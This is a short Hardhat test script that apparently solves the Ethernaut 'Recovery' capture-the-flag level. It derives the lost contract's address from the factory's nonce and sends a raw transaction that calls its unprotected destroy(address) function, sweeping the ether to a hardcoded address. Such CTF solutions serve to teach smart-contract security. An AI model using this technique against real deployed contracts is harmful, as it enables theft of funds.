import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Recovery`);
  const challengeAddress = await createChallenge(
    `0x8d07AC34D8f73e2892496c15223297e5B22B3ABE`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  let addr = await ethers.utils.getContractAddress({from:challenge.address, nonce:1})

  let selector = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('destroy(address)')).substring(0,10) // bytes4 function selector

  eoa.sendTransaction({to:addr, data:selector+"0000000000000000000000006B06820261843672e0ca3DC2797b17d779a8493D"}) // padded eoa address

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
